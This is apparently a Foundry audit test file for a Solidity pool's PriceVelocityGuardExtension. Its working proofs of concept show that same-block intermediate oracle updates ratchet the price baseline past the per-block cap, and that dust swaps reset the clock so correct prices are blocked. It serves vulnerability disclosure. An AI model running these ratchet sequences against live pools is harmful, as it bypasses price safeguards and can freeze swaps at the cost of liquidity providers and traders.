// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {MetricOmmPoolBaseTest, Q64} from "@metric-core-test/MetricOmmPool.base.t.sol";
import {BinState} from "@metric-core/types/PoolStorage.sol";
import {ExtensionOrders} from "@metric-core/types/PoolExtensionsConfig.sol";
import {ExtensionOrderTestLib} from "@metric-core-test/ExtensionOrderTestLib.sol";
import {IPriceVelocityGuardExtension} from "../../contracts/interfaces/extensions/IPriceVelocityGuardExtension.sol";
import {PriceVelocityGuardExtension} from "../../contracts/extensions/PriceVelocityGuardExtension.sol";

/// @notice Demonstrates that each successful swap replaces the PriceVelocity baseline,
/// allowing one logical same-block price movement to receive the configured allowance
/// repeatedly when it is decomposed across intermediate oracle observations.
///
/// Primary cap-bypass tests:
/// - test_directCumulativeMoveReverts: control showing the final movement is prohibited.
/// - test_twoObservationsAreEnoughToViolateThePerBlockCap: minimal proof using two
///   ordinary 10-token swaps.
/// - test_sameBlockIntermediateUpdatesBypassThePerBlockCap: amplification proof
///   showing twelve 9-bps steps exceed the 10-bps cap by more than 10x.
///
/// This pool test uses the base test's deterministic price provider to isolate the
/// extension state machine. PythOracleSequentialSameBlock.audit.t.sol separately
/// proves that correctly signed, increasingly timestamped Pyth observations can
/// reach the production provider path at every step.
contract PriceVelocitySameBlockRatchetAuditTest is MetricOmmPoolBaseTest {
  using SafeCast for uint256;

  uint64 private constant MAX_CHANGE_PER_BLOCK_E18 = 1e15; // 10 bps.
  uint256 private constant STEP_NUMERATOR = 10_009; // Each observation moves only 9 bps.
  uint256 private constant STEP_DENOMINATOR = 10_000;
  uint256 private constant STEPS = 12; // Cumulative move: ~1.085% in one block.
  uint104 private constant LP_SHARES = 10_000e18;
  uint128 private constant DUST_OUTPUT = 1e12;
  uint128 private constant NORMAL_OUTPUT = 10e18;

  PriceVelocityGuardExtension private velocity;

  function setUp() public override {
    super.setUp();

    velocity = new PriceVelocityGuardExtension(address(this));
    (BinState[] memory nn, BinState[] memory neg) = _defaultBinStateArrays();
    ExtensionOrders memory orders;
    orders.beforeSwap = ExtensionOrderTestLib.encodeExtensionOrder(1, 0, 0, 0, 0, 0, 0);

    pool = _deployPoolAndRegister(
      PoolDeployParams({
        priceProvider: address(oracle),
        extensions: _singleExtensionPoolExtensions(address(velocity)),
        extensionOrders: orders,
        immutablePriceProvider: true,
        protocolSpreadFeeE6: 0,
        adminSpreadFeeE6: 0,
        curBinDistFromProvidedPriceE6: 0,
        nonNegativeBinStates: nn,
        negativeBinStates: neg,
        protocolNotionalFeeE8: 50_000, // 5 bps; ordinary fees do not prevent baseline ratcheting.
        adminNotionalFeeE8: 0,
        immutablePriceProviderForRegistry: address(oracle),
        lowestBin: -1,
        highestBin: 0
      })
    );
    _approveUsersForPool(address(pool));
    velocity.setMaxChangePerBlock(address(pool), MAX_CHANGE_PER_BLOCK_E18);
    velocity.setLastMidPrice(address(pool), uint128(Q64));
    _addLiquidity(0, -1, 0, LP_SHARES, 0);
  }

  /// @notice Control: the extension correctly rejects the final 108.5-bps midpoint
  /// when it is compared directly with the block-opening midpoint under a 10-bps cap.
  function test_directCumulativeMoveReverts() public {
    uint256 finalMid = _midAfterSteps(Q64, STEPS);
    oracle.setBidAndAskPrice(finalMid.toUint128(), (finalMid + 1).toUint128());

    // No intermediate successful swap has changed the Q64 extension baseline.
    vm.expectPartialRevert(IPriceVelocityGuardExtension.PriceVelocityExceeded.selector);
    _swap(1, users[1], false, _i128ExactOut(DUST_OUTPUT), type(uint128).max);
  }

  function test_elapsedOnePercentMovePassesWithoutSamePriceRefresh() public {
    (, uint64 baselineBlock,) = velocity.priceVelocityState(address(pool));

    // At a 10 bps cap, a 1% move is permitted after 99 elapsed blocks:
    // (1%)^2 <= (0.1%)^2 * (1 + 99).
    vm.warp(block.timestamp + 99 * 12 seconds);
    vm.roll(uint256(baselineBlock) + 99);
    uint256 movedMid = Q64 * 101 / 100;
    oracle.setBidAndAskPrice(movedMid.toUint128(), (movedMid + 1).toUint128());

    _swap(1, users[1], false, _i128ExactOut(DUST_OUTPUT), type(uint128).max);

    (uint128 storedMid, uint64 storedBlock,) = velocity.priceVelocityState(address(pool));
    emit log_named_uint("fresh move accepted after elapsed blocks E18", (uint256(storedMid) - Q64) * 1e18 / Q64);
    emit log_named_uint("elapsed blocks used by the guard", storedBlock - baselineBlock);
    assertApproxEqAbs(uint256(storedMid), movedMid, 1, "fresh midpoint becomes the new baseline");
  }

  function test_samePriceDustSwapResetsClockAndBlocksFreshPrice() public {
    (, uint64 originalBaselineBlock,) = velocity.priceVelocityState(address(pool));
    vm.warp(block.timestamp + 99 * 12 seconds);
    vm.roll(uint256(originalBaselineBlock) + 99);

    // Model a newly signed observation at the unchanged market price. The oracle datum is
    // fresh and correct even though the extension's last price-changing swap was 99 blocks ago.
    oracle.setBidAndAskPrice(uint128(Q64), uint128(Q64 + 1));

    // A dust swap at exactly that fresh price records zero movement, but refreshes
    // lastUpdateBlock anyway and discards all 99 blocks of accumulated allowance.
    _swap(1, users[1], false, _i128ExactOut(DUST_OUTPUT), type(uint128).max);
    (uint128 refreshedMid, uint64 refreshedBlock,) = velocity.priceVelocityState(address(pool));
    assertApproxEqAbs(uint256(refreshedMid), Q64, 1, "same-price swap does not move the baseline");
    assertEq(refreshedBlock, uint64(block.number), "same-price swap resets the elapsed-time clock");

    // A newer and correct 1% observation arrives immediately afterwards. The same move
    // passes in test_elapsedOnePercentMovePassesWithoutSamePriceRefresh, but now the
    // attacker-reset clock grants only one 10 bps allowance and every pool swap reverts.
    uint256 movedMid = Q64 * 101 / 100;
    oracle.setBidAndAskPrice(movedMid.toUint128(), (movedMid + 1).toUint128());
    vm.expectPartialRevert(IPriceVelocityGuardExtension.PriceVelocityExceeded.selector);
    _swap(1, users[2], false, _i128ExactOut(DUST_OUTPUT), type(uint128).max);

    uint256 moveE18 = (movedMid - Q64) * 1e18 / Q64;
    uint256 requiredMultiplier = Math.ceilDiv(moveE18 * moveE18, uint256(MAX_CHANGE_PER_BLOCK_E18) ** 2);
    uint256 recoveryBlockDiff = requiredMultiplier - 1;

    emit log_named_uint("attacker clock refresh block", refreshedBlock);
    emit log_named_uint("new correct oracle move E18", moveE18);
    emit log_named_uint("additional blocked blocks", recoveryBlockDiff);

    vm.roll(uint256(refreshedBlock) + recoveryBlockDiff - 1);
    vm.expectPartialRevert(IPriceVelocityGuardExtension.PriceVelocityExceeded.selector);
    _swap(1, users[2], false, _i128ExactOut(DUST_OUTPUT), type(uint128).max);

    vm.roll(uint256(refreshedBlock) + recoveryBlockDiff);
    _swap(1, users[2], false, _i128ExactOut(DUST_OUTPUT), type(uint128).max);
  }

  /// @notice Amplification proof: twelve individually permitted 9-bps observations
  /// become a cumulative 108.5-bps movement in one block, over 10x the configured cap.
  function test_sameBlockIntermediateUpdatesBypassThePerBlockCap() public {
    uint256 initialBlock = block.number;
    uint256 attackerToken1Before = token1.balanceOf(address(callers[1]));
    uint256 gasBefore = gasleft();

    // Each iteration performs oracle update -> successful pool swap. The extension's
    // beforeSwap hook accepts the adjacent 9-bps movement, then stores that midpoint
    // as the baseline against which the next iteration is checked.
    uint256 currentMid = _ratchetToFinalMid();
    uint256 gasUsed = gasBefore - gasleft();
    uint256 attackerToken1Cost = attackerToken1Before - token1.balanceOf(address(callers[1]));

    (uint128 storedMid, uint64 storedBlock,) = velocity.priceVelocityState(address(pool));
    // Measure from the original Q64 block-opening baseline, not from the most recent
    // attacker-controlled intermediate checkpoint.
    uint256 cumulativeChangeE18 = (uint256(storedMid) - Q64) * 1e18 / Q64;

    emit log_named_uint("configured per-block cap E18", MAX_CHANGE_PER_BLOCK_E18);
    emit log_named_uint("accepted cumulative same-block change E18", cumulativeChangeE18);
    emit log_named_uint("number of intermediate observations", STEPS);
    emit log_named_uint("guard baseline block", storedBlock);
    emit log_named_decimal_uint("attacker token1 cost including 5 bps fees", attackerToken1Cost, 18);
    emit log_named_uint("mock-provider ratchet gas", gasUsed);

    assertGt(cumulativeChangeE18, 1e16, "more than 10x the configured cap was accepted");
    assertEq(uint256(storedMid), currentMid, "the final observation became the guard baseline");
    assertEq(storedBlock, uint64(initialBlock));
  }

  /// @notice Minimal primary proof: two new observations and two normal-sized swaps
  /// make the same final midpoint executable even though the direct transition reverts.
  function test_twoObservationsAreEnoughToViolateThePerBlockCap() public {
    uint256 initialBlock = block.number;
    uint256 firstMid = Q64 * STEP_NUMERATOR / STEP_DENOMINATOR;
    uint256 finalMid = firstMid * STEP_NUMERATOR / STEP_DENOMINATOR;
    uint256 cumulativeChangeE18 = (finalMid - Q64) * 1e18 / Q64;

    // Control path:
    // P0 = Q64, P2 = P0 * 1.0009^2. The direct P0 -> P2 movement is 18.0081 bps,
    // so a swap at P2 must revert under the configured 10-bps per-block cap.
    oracle.setBidAndAskPrice(finalMid.toUint128(), (finalMid + 1).toUint128());
    vm.expectPartialRevert(IPriceVelocityGuardExtension.PriceVelocityExceeded.selector);
    _swap(1, users[1], false, _i128ExactOut(NORMAL_OUTPUT), type(uint128).max);

    // Decomposed path, first observation:
    // P0 -> P1 is only 9 bps, so the first 10-token swap succeeds. beforeSwap then
    // replaces the original P0 baseline with P1 while lastUpdateBlock remains this block.
    oracle.setBidAndAskPrice(firstMid.toUint128(), (firstMid + 1).toUint128());
    _swap(1, users[1], false, _i128ExactOut(NORMAL_OUTPUT), type(uint128).max);

    // Decomposed path, second observation:
    // The guard now checks P1 -> P2 instead of P0 -> P2. This second 9-bps step also
    // succeeds, even though P2 is cumulatively 18.0081 bps above the block-opening P0.
    oracle.setBidAndAskPrice(finalMid.toUint128(), (finalMid + 1).toUint128());
    _swap(1, users[1], false, _i128ExactOut(NORMAL_OUTPUT), type(uint128).max);

    (uint128 storedMid, uint64 storedBlock,) = velocity.priceVelocityState(address(pool));
    emit log_named_uint("minimal bypass observations", 2);
    emit log_named_uint("minimal accepted cumulative move E18", cumulativeChangeE18);

    assertGt(cumulativeChangeE18, MAX_CHANGE_PER_BLOCK_E18);
    emit log_named_decimal_uint("output per normal-sized swap", NORMAL_OUTPUT, 18);
    assertEq(uint256(storedMid), finalMid);
    assertEq(storedBlock, uint64(initialBlock));
  }

  function test_priceReversalIsBlockedForQuadraticallyManyBlocks() public {
    uint256 finalMid = _ratchetToFinalMid();
    (, uint64 baselineBlock,) = velocity.priceVelocityState(address(pool));

    // A newer, correct oracle observation now reports that the transient move has fully
    // reversed. Without the ratchet the guard baseline would still be Q64 and this swap
    // would pass. Instead, it is compared with the attacker-advanced finalMid baseline.
    oracle.setBidAndAskPrice(uint128(Q64), uint128(Q64 + 1));
    vm.expectPartialRevert(IPriceVelocityGuardExtension.PriceVelocityExceeded.selector);
    _swap(1, users[1], false, _i128ExactOut(DUST_OUTPUT), type(uint128).max);

    uint256 reverseChangeE18 = (finalMid - Q64) * 1e18 / finalMid;
    uint256 requiredMultiplier =
      Math.ceilDiv(reverseChangeE18 * reverseChangeE18, uint256(MAX_CHANGE_PER_BLOCK_E18) ** 2);
    uint256 minimumBlockDiff = requiredMultiplier - 1;

    emit log_named_uint("reverse move E18", reverseChangeE18);
    emit log_named_uint("minimum recovery block difference", minimumBlockDiff);

    // The sqrt(elapsed blocks) allowance keeps the correct returned price unusable until
    // approximately (cumulativeMove / configuredCap)^2 blocks have elapsed.
    vm.roll(uint256(baselineBlock) + minimumBlockDiff - 1);
    vm.expectPartialRevert(IPriceVelocityGuardExtension.PriceVelocityExceeded.selector);
    _swap(1, users[1], false, _i128ExactOut(DUST_OUTPUT), type(uint128).max);

    vm.roll(uint256(baselineBlock) + minimumBlockDiff);
    _swap(1, users[1], false, _i128ExactOut(DUST_OUTPUT), type(uint128).max);
  }

  function _ratchetToFinalMid() private returns (uint256 currentMid) {
    uint256 initialBlock = block.number;
    currentMid = Q64;

    for (uint256 i; i < STEPS; ++i) {
      // This deterministic setter models the next authenticated provider observation.
      // The separate Pyth reachability PoC submits the equivalent sequence through
      // PythLazer signature verification and the production AnchoredPriceProvider.
      currentMid = currentMid * STEP_NUMERATOR / STEP_DENOMINATOR;
      oracle.setBidAndAskPrice(currentMid.toUint128(), (currentMid + 1).toUint128());

      // Each swap invokes PriceVelocityGuardExtension.beforeSwap. Since the movement
      // from the preceding checkpoint is 9 bps, the hook accepts it and commits
      // currentMid as the next baseline. No aggregate check against Q64 is performed.
      _swap(1, users[1], false, _i128ExactOut(DUST_OUTPUT), type(uint128).max);
      assertEq(block.number, initialBlock, "all ratchet steps execute in one block");
    }
  }

  function _midAfterSteps(uint256 mid, uint256 steps) private pure returns (uint256) {
    for (uint256 i; i < steps; ++i) {
      mid = mid * STEP_NUMERATOR / STEP_DENOMINATOR;
    }
    return mid;
  }
}
